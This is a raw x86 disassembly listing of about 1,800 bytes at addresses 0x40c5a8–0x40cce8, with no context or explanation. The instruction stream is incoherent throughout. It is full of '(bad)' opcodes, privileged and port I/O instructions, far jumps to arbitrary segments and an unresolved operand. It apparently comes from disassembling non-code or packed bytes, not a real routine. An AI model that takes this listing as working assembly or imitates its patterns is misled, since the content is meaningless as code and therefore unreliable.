  40c5a8:	mov    cl,0xd1
  40c5aa:	popf   
  40c5ab:	pop    esp
  40c5ac:	je     0x40c542
  40c5ae:	cmp    BYTE PTR [esi+edi*1+0x7c],0xe1
  40c5b3:	mov    bh,0x3d
  40c5b5:	cmp    cl,al
  40c5b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c5b8:	cmp    eax,0xc09b05d1
  40c5bd:	mov    cl,0xfe
  40c5bf:	dec    edx
  40c5c0:	jle    0x40c577
  40c5c2:	sbb    eax,0xc0fc5cd3
  40c5c7:	imul   esp,DWORD PTR [esi+0x7ca2c99e],0x28575a7
  40c5d1:	pop    edi
  40c5d2:	ss pop ecx
  40c5d4:	neg    cl
  40c5d6:	push   edi
  40c5d7:	clc    
  40c5d8:	inc    ebx
  40c5d9:	mov    edx,0x50b65f69
  40c5de:	fiadd  WORD PTR [eax-0x69b30cd9]
  40c5e4:	jg     0x40c603
  40c5e6:	adc    al,0xc8
  40c5e8:	push   cs
  40c5e9:	or     ch,BYTE PTR [ebx+0x5e580be0]
  40c5ef:	inc    edx
  40c5f0:	cmp    eax,0x4fd3e149
  40c5f5:	or     ch,bh
  40c5f7:	test   al,0x9
  40c5f9:	cli    
  40c5fa:	inc    ebx
  40c5fb:	stc    
  40c5fc:	and    dh,BYTE PTR [ebp-0x14]
  40c5ff:	test   al,0xc8
  40c601:	xor    BYTE PTR [eax+ebx*1],ah
  40c604:	pop    ebx
  40c605:	cmp    DWORD PTR [eax-0x36],ebp
  40c608:	pushf  
  40c609:	lods   al,BYTE PTR ds:[esi]
  40c60a:	sbb    eax,0xc072dde6
  40c60f:	xchg   esp,eax
  40c610:	sbb    al,0x4
  40c612:	xchg   edx,eax
  40c613:	test   DWORD PTR [edx+edx*2+0x62067384],ecx
  40c61a:	aaa    
  40c61b:	jbe    0x40c679
  40c61d:	rcl    BYTE PTR [ebp-0x4c],1
  40c620:	out    0x15,al
  40c622:	dec    esp
  40c623:	jmp    0x40c68b
  40c625:	nop
  40c626:	cld    
  40c627:	repnz mov ecx,gs
  40c62a:	cs scas al,BYTE PTR es:[edi]
  40c62c:	ds pop ebp
  40c62e:	mov    edx,0x3a4ce71c
  40c633:	mov    fs,WORD PTR [eax-0x2b]
  40c636:	scas   eax,DWORD PTR es:[edi]
  40c637:	jle    0x40c5c0
  40c639:	pop    ds
  40c63a:	xor    ecx,DWORD PTR [edi-0x7]
  40c63d:	adc    al,0xfd
  40c63f:	jp     0x40c682
  40c641:	hlt    
  40c642:	mov    DWORD PTR [ecx],esp
  40c644:	stos   DWORD PTR es:[edi],eax
  40c645:	jo     0x40c5e7
  40c647:	pop    eax
  40c648:	xchg   ebx,eax
  40c649:	arpl   WORD PTR [esi+eax*8-0x1cf3b228],cx
  40c650:	sbb    DWORD PTR [eax-0x64],esp
  40c653:	popf   
  40c654:	out    dx,eax
  40c655:	(bad)  
  40c656:	or     al,al
  40c658:	call   0xa14d:0xc6871fa0
  40c65f:	jbe    0x40c68e
  40c661:	stos   BYTE PTR es:[edi],al
  40c662:	jl     0x40c6d3
  40c664:	xor    al,0x5
  40c666:	pop    edx
  40c667:	dec    ebx
  40c668:	mov    bl,0x41
  40c66a:	xchg   edi,eax
  40c66b:	ins    BYTE PTR es:[edi],dx
  40c66c:	mov    DWORD PTR [ecx+0x18],ecx
  40c66f:	mov    edx,0xd12db2db
  40c674:	(bad)
  40c678:	test   edx,ebp
  40c67a:	adc    BYTE PTR ds:0x3a1886b6,al
  40c680:	repnz or dh,BYTE PTR [esi+0x1a7a2df5]
  40c687:	gs adc eax,edx
  40c68a:	stc    
  40c68b:	mov    esi,0x79292b9
  40c690:	cmp    al,0xae
  40c692:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c693:	outs   dx,BYTE PTR ds:[esi]
  40c694:	pusha  
  40c695:	and    bl,cl
  40c697:	std    
  40c698:	cmp    al,0xdf
  40c69a:	inc    eax
  40c69b:	jnp    0x40c6d6
  40c69d:	std    
  40c69e:	fmul   st,st(4)
  40c6a0:	les    ebp,FWORD PTR [ebx+eiz*1]
  40c6a3:	push   cs
  40c6a4:	cmp    dl,0x31
  40c6a7:	sub    bl,bl
  40c6a9:	popf   
  40c6aa:	mov    ds:0xa1e02bb7,eax
  40c6af:	(bad)  
  40c6b0:	cdq    
  40c6b1:	push   eax
  40c6b2:	test   BYTE PTR [edi+eiz*4+0x4b],ah
  40c6b6:	or     al,0xd
  40c6b8:	push   esp
  40c6b9:	push   edi
  40c6ba:	in     eax,0xdf
  40c6bc:	push   ds
  40c6bd:	pop    ebx
  40c6be:	push   esi
  40c6bf:	sub    edi,eax
  40c6c1:	arpl   bp,di
  40c6c3:	es ja  0x40c6ce
  40c6c6:	les    eax,FWORD PTR [edx+0x3b341430]
  40c6cc:	sbb    eax,0x87191dc5
  40c6d1:	push   ss
  40c6d2:	in     eax,0xb3
  40c6d4:	push   edx
  40c6d5:	test   DWORD PTR [edx],ecx
  40c6d7:	xchg   esi,eax
  40c6d8:	xor    DWORD PTR [eax-0x384ce229],0xffffff8f
  40c6df:	sub    BYTE PTR [eax+ebx*2+0xf],dl
  40c6e3:	inc    esi
  40c6e4:	inc    edi
  40c6e5:	cs cmp al,0xb8
  40c6e8:	pop    esi
  40c6e9:	jo     0x40c6c5
  40c6eb:	adc    eax,0xb14babb5
  40c6f0:	idiv   BYTE PTR [edi-0x2d2a34f5]
  40c6f6:	adc    ebp,ecx
  40c6f8:	dec    esi
  40c6f9:	push   edx
  40c6fa:	inc    eax
  40c6fb:	loopne 0x40c6e2
  40c6fd:	into   
  40c6fe:	mov    edi,0x81200a26
  40c703:	cs popf 
  40c705:	push   esp
  40c706:	xchg   DWORD PTR [edx+0x5e],ecx
  40c709:	adc    bl,BYTE PTR [edx-0xba35cf1]
  40c70f:	dec    edx
  40c710:	stos   DWORD PTR es:[edi],eax
  40c711:	cmp    edi,0x987af266
  40c717:	test   DWORD PTR [ebx+eiz*4-0x72],edi
  40c71b:	add    ebp,ecx
  40c71d:	push   esp
  40c71e:	sub    al,BYTE PTR [edx-0x35]
  40c721:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c722:	mov    dl,0x22
  40c724:	adc    BYTE PTR [edi],al
  40c726:	xchg   edx,eax
  40c727:	and    esp,edx
  40c729:	mov    DWORD PTR [esi+0x30e619e0],esi
  40c72f:	inc    ebx
  40c730:	in     eax,0xfd
  40c732:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c733:	sub    BYTE PTR [esi+0x56],bh
  40c736:	in     eax,dx
  40c737:	jle    0x40c729
  40c739:	in     eax,dx
  40c73a:	jb     0x40c6f1
  40c73c:	push   esi
  40c73d:	out    0x59,eax
  40c73f:	pop    eax
  40c740:	jge    0x40c6d3
  40c742:	pop    ds
  40c743:	push   ebx
  40c744:	and    DWORD PTR fs:[eax-0x1b],ebp
  40c748:	or     esp,0xffffff83
  40c74b:	fsubr  QWORD PTR fs:[ecx+0x143635b6]
  40c752:	nop
  40c753:	xor    esp,DWORD PTR [eax+eiz*2-0x9]
  40c757:	adc    ch,bl
  40c759:	ja     0x40c704
  40c75b:	push   eax
  40c75c:	mov    ebx,DWORD PTR [ecx]
  40c75e:	dec    esp
  40c75f:	maskmovq mm5,mm3
  40c762:	jg     0x40c7c2
  40c764:	sbb    bh,BYTE PTR [esi-0x5]
  40c767:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c769:	adc    DWORD PTR [edi-0x55200b29],edx
  40c76f:	ins    DWORD PTR es:[edi],dx
  40c770:	and    esi,DWORD PTR [esi]
  40c772:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c773:	pop    edi
  40c774:	lods   eax,DWORD PTR ds:[esi]
  40c775:	repz repnz pop ds
  40c778:	sub    dh,BYTE PTR ds:0x26f74fdf
  40c77e:	data16 hlt 
  40c780:	scas   al,BYTE PTR es:[edi]
  40c781:	pop    ecx
  40c782:	jg     0x40c7c5
  40c784:	and    esi,DWORD PTR [ecx+ecx*1+0x3e]
  40c788:	fisttp WORD PTR [ecx+0x2d569499]
  40c78e:	sbb    al,0xb4
  40c790:	and    BYTE PTR [ecx+edx*8-0x4d],dh
  40c794:	in     al,dx
  40c795:	push   0xc6e99648
  40c79a:	jmp    0x67c4:0xe91eb1a8
  40c7a1:	pop    ebp
  40c7a2:	test   BYTE PTR [eax-0x3ed06d68],0x7a
  40c7a9:	adc    al,dh
  40c7ab:	test   al,0xe1
  40c7ad:	pop    edi
  40c7ae:	adc    eax,esi
  40c7b0:	mov    bl,0x2a
  40c7b2:	cli    
  40c7b3:	(bad)  
  40c7b4:	enter  0x9a20,0xfa
  40c7b8:	mov    esp,DWORD PTR [esi+0x160aa331]
  40c7be:	das    
  40c7bf:	pop    es
  40c7c0:	pop    ebx
  40c7c1:	mov    cl,0xf3
  40c7c3:	add    dl,BYTE PTR [edi-0x526f94a1]
  40c7c9:	mov    al,0x7e
  40c7cb:	xor    al,0x5e
  40c7cd:	or     eax,0x276568e1
  40c7d2:	cli    
  40c7d3:	popa   
  40c7d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c7d5:	push   cs
  40c7d6:	ret    0x4b81
  40c7d9:	test   BYTE PTR [edx+edx*1+0x7bba3a6d],0x80
  40c7e1:	(bad)  
  40c7e2:	pop    ebp
  40c7e3:	add    DWORD PTR [esi-0x573268d3],edi
  40c7e9:	jns    0x40c7a6
  40c7eb:	xor    edx,ecx
  40c7ed:	cmp    eax,0x92a8c10e
  40c7f2:	adc    eax,0x32368224
  40c7f7:	sbb    DWORD PTR [edx-0x1cc482bb],ecx
  40c7fd:	sahf   
  40c7fe:	sub    edx,DWORD PTR [esi]
  40c800:	fsubr  DWORD PTR [esi+edx*8+0x3f]
  40c804:	inc    edi
  40c805:	inc    eax
  40c806:	pop    ss
  40c807:	fld    QWORD PTR [edi-0x53]
  40c80a:	mov    al,ds:0xa11be824
  40c80f:	and    ecx,ebp
  40c811:	sbb    al,0x56
  40c813:	add    ebx,esp
  40c815:	mov    cl,0xcf
  40c817:	aaa    
  40c818:	inc    ecx
  40c819:	cdq    
  40c81a:	sbb    DWORD PTR [esi-0x40a97f99],ebp
  40c820:	mov    eax,cs
  40c822:	jae    0x40c82e
  40c824:	inc    edi
  40c825:	inc    eax
  40c826:	arpl   si,ax
  40c828:	jno    0x40c7ba
  40c82a:	or     DWORD PTR gs:0xc1165ae8,ebx
  40c831:	call   0x29131a60
  40c836:	or     DWORD PTR [esi-0x7eaf0300],esp
  40c83c:	mov    dl,0x38
  40c83e:	or     bh,ah
  40c840:	xchg   ebp,eax
  40c841:	(bad)  
  40c842:	jp     0x40c810
  40c844:	mov    esp,cs
  40c846:	ja     0x40c8b3
  40c848:	sti    
  40c849:	aad    0x25
  40c84b:	dec    edx
  40c84c:	(bad)  
  40c84d:	push   esi
  40c84e:	and    DWORD PTR [ebp+0x2ebe299a],eax
  40c854:	adc    DWORD PTR [edx],edx
  40c856:	cmp    eax,0xd27649d7
  40c85b:	jl     0x40c807
  40c85d:	xchg   DWORD PTR [ebx-0xa71d4be],esp
  40c863:	fst    QWORD PTR [ecx+ebx*2]
  40c866:	jp     0x40c846
  40c868:	inc    ebx
  40c869:	ins    DWORD PTR es:[edi],dx
  40c86a:	sbb    BYTE PTR [ebp-0x78],bl
  40c86d:	fs mov bh,0xc3
  40c870:	jnp    0x40c8c0
  40c872:	jmp    0x40c848
  40c874:	pop    ss
  40c875:	cdq    
  40c876:	adc    al,0xa5
  40c878:	adc    cl,bh
  40c87a:	out    0xbb,eax
  40c87c:	bound  edx,QWORD PTR [esi+0x63ffb91a]
  40c882:	out    0x8c,eax
  40c884:	lahf   
  40c885:	sub    edx,DWORD PTR [ebp+0x4da95581]
  40c88b:	jbe    0x40c852
  40c88d:	fwait
  40c88e:	js     0x40c8d1
  40c890:	leave  
  40c891:	and    esp,DWORD PTR [ebx-0x50]
  40c894:	nop
  40c895:	and    DWORD PTR [eax+edx*4+0xb0a422f],ebp
  40c89c:	or     dl,BYTE PTR [esp+eiz*4+0x37115151]
  40c8a3:	xor    al,bl
  40c8a5:	sbb    DWORD PTR [esi],ecx
  40c8a7:	lahf   
  40c8a8:	adc    ch,al
  40c8aa:	aaa    
  40c8ab:	push   0xffffffd0
  40c8ad:	outs   dx,BYTE PTR ds:[esi]
  40c8ae:	or     eax,0xfefe6704
  40c8b3:	jge    0x40c8fa
  40c8b5:	sbb    BYTE PTR [esi],0xf4
  40c8b8:	pop    ebp
  40c8b9:	sbb    eax,0x14fef770
  40c8be:	test   DWORD PTR [eax],edi
  40c8c0:	jbe    0x40c84b
  40c8c2:	repnz or ebx,ecx
  40c8c5:	adc    al,BYTE PTR [eax+esi*4+0x66fa312c]
  40c8cc:	or     DWORD PTR [esi+0x1d207cb5],edi
  40c8d2:	in     al,0xc7
  40c8d4:	shr    BYTE PTR [eax+0x79],0xe9
  40c8d8:	add    DWORD PTR [eax],ebp
  40c8da:	xchg   esi,eax
  40c8db:	loopne 0x40c86b
  40c8dd:	push   ebp
  40c8de:	ss inc edi
  40c8e0:	rol    DWORD PTR [eax+0x2066c74a],0xe8
  40c8e7:	jns    0x40c87f
  40c8e9:	inc    esi
  40c8ea:	test   al,0xef
  40c8ec:	retf   
  40c8ed:	jbe    0x40c8b5
  40c8ef:	push   0xffffffe2
  40c8f1:	or     DWORD PTR [edx-0x53744891],eax
  40c8f7:	scas   al,BYTE PTR es:[edi]
  40c8f8:	and    eax,DWORD PTR [ebx]
  40c8fa:	push   esp
  40c8fb:	inc    ebx
  40c8fc:	aam    0x36
  40c8fe:	test   eax,0xad93f1b4
  40c903:	mov    ebp,0x75bb840c
  40c908:	ins    DWORD PTR es:[edi],dx
  40c909:	fnstcw WORD PTR [ebx+0x63]
  40c90c:	mov    dh,0x33
  40c90e:	xor    eax,0xc8c5f055
  40c913:	pop    ds
  40c914:	test   al,0x0
  40c916:	icebp  
  40c917:	jo     0x40c8eb
  40c919:	pop    ss
  40c91a:	cmp    eax,0x12584d9e
  40c91f:	pop    esp
  40c920:	sub    bl,BYTE PTR [ebp+0x5e]
  40c923:	out    dx,al
  40c924:	lds    ebx,FWORD PTR [edi-0x15]
  40c927:	loope  0x40c8f5
  40c929:	hlt    
  40c92a:	pop    esi
  40c92b:	cdq    
  40c92c:	push   ss
  40c92d:	in     al,0x92
  40c92f:	mov    al,ds:0x4eacadbb
  40c934:	aad    0x98
  40c936:	inc    ebp
  40c937:	adc    eax,0xeb31fcde
  40c93c:	xchg   bx,ax
  40c93e:	mov    cl,0x34
  40c940:	lods   al,BYTE PTR ds:[esi]
  40c941:	push   edi
  40c942:	lds    edx,FWORD PTR [ecx+0x3a309292]
  40c948:	push   ss
  40c949:	test   DWORD PTR [edx-0x28],edi
  40c94c:	ins    BYTE PTR es:[edi],dx
  40c94d:	dec    ecx
  40c94e:	xchg   edi,eax
  40c94f:	sub    BYTE PTR [esi],cl
  40c951:	fmul   DWORD PTR [edi]
  40c953:	rcr    dl,1
  40c955:	ret    
  40c956:	hlt    
  40c957:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c958:	sti    
  40c959:	mov    ecx,DWORD PTR [ebp-0x17]
  40c95c:	add    DWORD PTR [eax+ebp*8],edx
  40c95f:	or     DWORD PTR [ebp-0x62e44ce],esp
  40c965:	je     0x40c946
  40c967:	dec    esp
  40c968:	push   0x7c830553
  40c96d:	push   ds
  40c96e:	cwde   
  40c96f:	loop   0x40c963
  40c971:	shl    DWORD PTR [eax-0x3975283d],1
  40c977:	retf   
  40c978:	xlat   BYTE PTR ds:[ebx]
  40c979:	and    eax,0x1941dc72
  40c97e:	add    bh,BYTE PTR [si-0x7b7d]
  40c983:	push   edx
  40c984:	sahf   
  40c985:	rcl    DWORD PTR [ebp+edx*8-0x48cd9de8],1
  40c98c:	jmp    0xe8353c37
  40c991:	adc    BYTE PTR [edi-0x19],0x30
  40c995:	loope  0x40c9ec
  40c997:	mov    al,ds:0x609bfbee
  40c99c:	aad    0x44
  40c99e:	push   ecx
  40c99f:	ins    BYTE PTR es:[edi],dx
  40c9a0:	ret    0xf2c1
  40c9a3:	(bad)  
  40c9a5:	cmp    eax,0xfe631ba9
  40c9aa:	adc    eax,0xc2c709db
  40c9af:	xchg   esp,eax
  40c9b0:	shl    BYTE PTR [ebp+0x64],0x64
  40c9b4:	add    ebp,DWORD PTR [esi]
  40c9b6:	jae    0x40c94d
  40c9b8:	cdq    
  40c9b9:	scas   eax,DWORD PTR es:[edi]
  40c9ba:	out    0x7c,al
  40c9bc:	imul   edi,DWORD PTR [edx-0x65637ba8],0x78
  40c9c3:	push   esp
  40c9c4:	(bad)  
  40c9c5:	and    al,0x98
  40c9c7:	cld    
  40c9c8:	test   BYTE PTR [esi],cl
  40c9ca:	cmc    
  40c9cb:	jbe    0x40c954
  40c9cd:	test   BYTE PTR [ebx+0x58],0x4c
  40c9d1:	adc    DWORD PTR [esi],esi
  40c9d3:	bound  ebp,QWORD PTR [ebp+0x2f69d33f]
  40c9d9:	data16 int3 
  40c9db:	(bad)  
  40c9dc:	adc    edi,esp
  40c9de:	lea    ecx,[edi+0x2a48acbf]
  40c9e4:	test   DWORD PTR [edx+0x66],ebp
  40c9e7:	pop    esp
  40c9e8:	fsubp  st(7),st
  40c9ea:	leave  
  40c9eb:	dec    ecx
  40c9ec:	fdiv   st,st(4)
  40c9ee:	scas   al,BYTE PTR es:[edi]
  40c9ef:	(bad)  
  40c9f0:	xchg   ebx,eax
  40c9f1:	xrelease xchg BYTE PTR [edx],dh
  40c9f4:	aad    0xed
  40c9f6:	(bad)  
  40c9f7:	cmp    ebx,edi
  40c9f9:	cs jns 0x40ca0b
  40c9fc:	clts   
  40c9fe:	mov    edi,0x7f906f5a
  40ca03:	mov    bl,0x6d
  40ca05:	(bad)  
  40ca06:	jle    0x40ca0a
  40ca08:	(bad)  
  40ca09:	test   al,0x94
  40ca0b:	lods   eax,DWORD PTR ds:[esi]
  40ca0c:	pop    ebp
  40ca0d:	mov    al,0xfd
  40ca0f:	aam    0xe6
  40ca11:	pop    esp
  40ca12:	mov    eax,ds:0x8ca9aa4e
  40ca17:	enter  0xd374,0xbc
  40ca1b:	mov    BYTE PTR [edi-0x75],cl
  40ca1e:	xor    ecx,DWORD PTR [edx-0x53]
  40ca21:	mov    WORD PTR [ecx],gs
  40ca23:	xchg   ecx,eax
  40ca24:	out    0xd3,al
  40ca26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca27:	mov    BYTE PTR [ebx],al
  40ca29:	bound  ebp,QWORD PTR [ebx+eax*1]
  40ca2c:	and    ecx,DWORD PTR [esi]
  40ca2e:	pop    ebp
  40ca2f:	frstor [edx-0x7dfc467e]
  40ca35:	add    esp,esi
  40ca37:	push   esi
  40ca38:	call   0xc7ac750b
  40ca3d:	and    ah,dh
  40ca3f:	cs xchg ebp,eax
  40ca41:	cld    
  40ca42:	imul   esp,edi,0xffffffe8
  40ca45:	stos   BYTE PTR es:[edi],al
  40ca46:	cdq    
  40ca47:	cmp    DWORD PTR [ebx-0x3203209],edx
  40ca4d:	ret    0x67f
  40ca50:	sbb    esp,DWORD PTR [edx+0x11]
  40ca53:	mov    DWORD PTR [edx+0x570f76c8],esp
  40ca59:	mov    ah,BYTE PTR [esi+0x25de19f4]
  40ca5f:	adc    cl,al
  40ca61:	icebp  
  40ca62:	in     eax,dx
  40ca63:	pop    ebp
  40ca64:	ins    DWORD PTR es:[edi],dx
  40ca65:	xchg   ebx,eax
  40ca66:	bound  ebx,QWORD PTR [ebx]
  40ca68:	pop    ecx
  40ca69:	mov    cl,0x66
  40ca6b:	imul   ebp,DWORD PTR [ecx],0xffffff82
  40ca6e:	mov    ebx,0xb2a0276e
  40ca73:	pop    ecx
  40ca74:	ins    BYTE PTR es:[edi],dx
  40ca75:	or     edx,DWORD PTR [ecx]
  40ca77:	mov    esi,0x6d6838b7
  40ca7c:	fmul   QWORD PTR [edx-0x4]
  40ca7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca80:	retf   0x32e7
  40ca83:	paddsw mm6,QWORD PTR [ecx]
  40ca86:	into   
  40ca87:	and    esi,DWORD PTR [edx+0x8]
  40ca8a:	and    esi,edx
  40ca8c:	push   ecx
  40ca8d:	xchg   edi,ebp
  40ca8f:	dec    esp
  40ca90:	test   DWORD PTR [edx+0x7a7d1ac4],eax
  40ca96:	mov    al,BYTE PTR [ecx-0x269d28d3]
  40ca9c:	add    eax,esi
  40ca9e:	(bad)  
  40ca9f:	jae    0x40cab5
  40caa1:	ins    DWORD PTR es:[edi],dx
  40caa2:	dec    edi
  40caa3:	cmp    dl,BYTE PTR [ebx+0x19]
  40caa6:	cmp    eax,0xa9b4d898
  40caab:	jns    0x40cb0f
  40caad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40caae:	ret    
  40caaf:	inc    esp
  40cab0:	sar    BYTE PTR [edi+0x4175e37c],cl
  40cab6:	clc    
  40cab7:	dec    eax
  40cab8:	mov    dl,BYTE PTR [eax-0x7c4ca53b]
  40cabe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cabf:	inc    ebp
  40cac0:	xchg   ecx,edx
  40cac2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cac3:	cwde   
  40cac4:	leave  
  40cac5:	pop    ss
  40cac6:	mov    ebx,0x84d91328
  40cacb:	mov    ch,0x89
  40cacd:	dec    edi
  40cace:	mov    WORD PTR [ebx-0x8],fs
  40cad1:	sub    cl,ah
  40cad3:	push   edx
  40cad4:	pushf  
  40cad5:	daa    
  40cad6:	lea    ecx,[edi]
  40cad8:	push   0x4
  40cada:	cmp    edx,DWORD PTR [esi]
  40cadc:	dec    esp
  40cadd:	mov    eax,ds:0xf5080aae
  40cae2:	repz inc edi
  40cae4:	add    eax,0xdbfd1f6c
  40cae9:	jne    0x40caa1
  40caeb:	std    
  40caec:	retf   0x8063
  40caef:	test   BYTE PTR [ebp+0x55d38063],ah
  40caf5:	jmp    0xcbc5:0x7d45928c
  40cafc:	daa    
  40cafd:	xchg   eax,edi
  40caff:	cmp    BYTE PTR [edx],ah
  40cb01:	mov    dh,0x6a
  40cb03:	or     bh,bh
  40cb05:	sub    al,0xeb
  40cb07:	mov    ds:0x2ea9ceae,eax
  40cb0c:	inc    edx
  40cb0d:	idiv   al
  40cb0f:	mov    esp,0xd5cad504
  40cb14:	jmp    0xaf24:0xba75ef02
  40cb1b:	mov    bl,0xe7
  40cb1d:	mov    ah,0x3
  40cb1f:	push   0xffffff85
  40cb21:	add    eax,0x2db0266b
  40cb26:	lahf   
  40cb27:	pop    ebp
  40cb28:	bound  ebx,QWORD PTR ds:0xe4981544
  40cb2e:	aas    
  40cb2f:	imul   ebp,DWORD PTR [eax],0xedc503f2
  40cb35:	mov    eax,0xc4080b7e
  40cb3a:	add    BYTE PTR [ebp-0x10440484],0xd7
  40cb41:	or     eax,0x68725a2b
  40cb46:	xchg   ebp,eax
  40cb47:	test   DWORD PTR [ebx-0xcf68ad0],0x35bbc168
  40cb51:	(bad)  
  40cb52:	imul   dl
  40cb54:	sub    BYTE PTR [esi-0x22557511],cl
  40cb5a:	pop    ds
  40cb5b:	cmp    esi,edi
  40cb5d:	inc    esi
  40cb5e:	daa    
  40cb5f:	icebp  
  40cb60:	shl    DWORD PTR [ebx-0x3434e3f7],1
  40cb66:	jle    0x40cb6d
  40cb68:	popf   
  40cb69:	pop    ebp
  40cb6a:	sbb    DWORD PTR [edi+0x21],ebp
  40cb6d:	out    0xd7,eax
  40cb6f:	and    al,0x77
  40cb71:	and    BYTE PTR [edi],0x9
  40cb74:	test   eax,0xd8200f89
  40cb79:	out    dx,al
  40cb7a:	mov    edx,0x591488ee
  40cb7f:	mov    eax,DWORD PTR ds:0x9ccf24f0
  40cb85:	loope  0x40cb2f
  40cb87:	sbb    esi,DWORD PTR [esi-0x71]
  40cb8a:	ss push edi
  40cb8c:	sbb    eax,0x2b06d72b
  40cb91:	pop    ss
  40cb92:	sbb    ebp,DWORD PTR [esi-0x2525a028]
  40cb98:	ins    BYTE PTR es:[edi],dx
  40cb99:	mov    edi,ecx
  40cb9b:	jno    0x40cbe7
  40cb9d:	or     edx,esi
  40cb9f:	loope  0x40cb92
  40cba1:	mov    bh,BYTE PTR [edx-0x79]
  40cba4:	mov    esp,0x1179e7ea
  40cba9:	jmp    0x40cc1d
  40cbab:	pushf  
  40cbac:	xchg   edx,eax
  40cbad:	mov    ah,0x13
  40cbaf:	mov    cl,0x51
  40cbb1:	in     al,dx
  40cbb2:	ss push ds
  40cbb4:	mov    eax,ds:0xa74536a4
  40cbb9:	dec    edi
  40cbba:	cmc    
  40cbbb:	enter  0x849,0xc4
  40cbbf:	je     0x40cbb6
  40cbc1:	fild   DWORD PTR [edx+0x1b]
  40cbc4:	xchg   ecx,eax
  40cbc5:	std    
  40cbc6:	push   0xffffffad
  40cbc8:	fbstp  TBYTE PTR [eax-0x56db327f]
  40cbce:	dec    ebp
  40cbcf:	jo     0x40cb79
  40cbd1:	cmp    eax,0xd4e3c3b3
  40cbd6:	adc    bh,BYTE PTR [ebx-0x9a85284]
  40cbdc:	push   ebp
  40cbdd:	mov    ebx,0x63738d7d
  40cbe2:	stc    
  40cbe3:	jl     0x40cbce
  40cbe5:	or     DWORD PTR [esi],ebx
  40cbe7:	xlat   BYTE PTR ds:[ebx]
  40cbe8:	pop    esi
  40cbe9:	lods   eax,DWORD PTR ds:[esi]
  40cbea:	sbb    ah,BYTE PTR [ecx-0x54d98c14]
  40cbf0:	push   ebp
  40cbf1:	or     ch,bh
  40cbf3:	int    0xab
  40cbf5:	(bad)  
  40cbf6:	jmp    0xb144:0x8cf52413
  40cbfd:	and    esi,DWORD PTR gs:[edi+0x70]
  40cc01:	sub    dh,BYTE PTR [ecx+0x3a448ee]
  40cc07:	(bad)  
  40cc09:	stc    
  40cc0a:	ds pop ecx
  40cc0c:	inc    ebx
  40cc0d:	ret    
  40cc0e:	fidivr WORD PTR [edx+ebx*4-0x55]
  40cc12:	mov    ebx,0xec1a01eb
  40cc17:	cwde   
  40cc18:	mov    dh,0x9b
  40cc1a:	sbb    edi,DWORD PTR [ecx]
  40cc1c:	sub    eax,0x14a64597
  40cc21:	lods   al,BYTE PTR ds:[esi]
  40cc22:	xor    eax,DWORD PTR [ebp-0x53564eba]
  40cc28:	push   edx
  40cc29:	lods   al,BYTE PTR ds:[esi]
  40cc2a:	sbb    dh,BYTE PTR [edx-0xf]
  40cc2d:	xchg   esi,eax
  40cc2e:	mov    DWORD PTR [edx],esp
  40cc30:	xchg   ecx,eax
  40cc31:	push   es
  40cc32:	arpl   WORD PTR [ebx+0x5a1661d6],di
  40cc38:	pop    es
  40cc39:	and    BYTE PTR [esi-0xd],al
  40cc3c:	xchg   ebp,eax
  40cc3d:	fisub  WORD PTR fs:[ecx]
  40cc40:	ror    BYTE PTR [bp+0x3023],cl
  40cc45:	or     ebp,DWORD PTR [eax+0x53f87f69]
  40cc4b:	add    BYTE PTR [esi+0x432f969f],cl
  40cc51:	ret    0x4c7f
  40cc54:	jae    0x40cc23
  40cc56:	mov    ?,edx
  40cc58:	xor    edi,ebp
  40cc5a:	fisttp WORD PTR [ebx]
  40cc5c:	jo     0x40cc15
  40cc5e:	add    DWORD PTR [ebx],eax
  40cc60:	fisttp QWORD PTR [edi]
  40cc62:	lds    eax,FWORD PTR [edx-0x41]
  40cc65:	cs xor eax,0x92133c36
  40cc6b:	inc    esp
  40cc6c:	retf   
  40cc6d:	mov    ds:0xfe472666,eax
  40cc72:	test   DWORD PTR [ebp+0x1c],ecx
  40cc75:	test   eax,0x52550211
  40cc7a:	test   DWORD PTR [ebp+ecx*2+0x38],eax
  40cc7e:	add    al,0xed
  40cc80:	loop   0x40ccc5
  40cc82:	sbb    BYTE PTR [ebp-0x6a],al
  40cc85:	aas    
  40cc86:	retf   0x87c0
  40cc89:	mov    ebp,0x33beb1d2
  40cc8e:	mov    ch,0x33
  40cc90:	data16 fbld TBYTE PTR [esi-0x16]
  40cc94:	sub    BYTE PTR [ecx-0x35de4f89],dh
  40cc9a:	call   0xdc0:0x2317aff2
  40cca1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cca2:	push   es
  40cca3:	push   ebp
  40cca4:	inc    eax
  40cca5:	out    0x30,eax
  40cca7:	mov    ds:0xd6cdc560,eax
  40ccac:	push   ecx
  40ccad:	dec    ebx
  40ccae:	push   ecx
  40ccaf:	cwde   
  40ccb0:	js     0x40ccc3
  40ccb2:	inc    ebp
  40ccb3:	outs   dx,BYTE PTR ds:[esi]
  40ccb4:	pop    esi
  40ccb5:	cli    
  40ccb6:	and    BYTE PTR [edi+0x1b],bh
  40ccb9:	push   0xffffffdc
  40ccbb:	pop    ecx
  40ccbc:	lock cmc 
  40ccbe:	rcl    BYTE PTR [ebx],0x94
  40ccc1:	xlat   BYTE PTR ds:[ebx]
  40ccc2:	dec    ecx
  40ccc3:	retf   0xd3be
  40ccc6:	push   ecx
  40ccc7:	sub    BYTE PTR [ecx+0x3feccdf9],bh
  40cccd:	or     bh,BYTE PTR [edx+0x444429e2]
  40ccd3:	mov    ecx,0x8727273b
  40ccd8:	push   ecx
  40ccd9:	push   0xffffffe1
  40ccdb:	sbb    al,0x5c
  40ccdd:	xchg   ebx,eax
  40ccde:	es xchg edx,eax
  40cce0:	xchg   esi,eax
  40cce1:	pop    eax
  40cce2:	pop    ebp
  40cce3:	xor    bl,BYTE PTR [edi+0x20]
  40cce6:	sar    esi,cl
  40cce8:	mov    bl,0x64
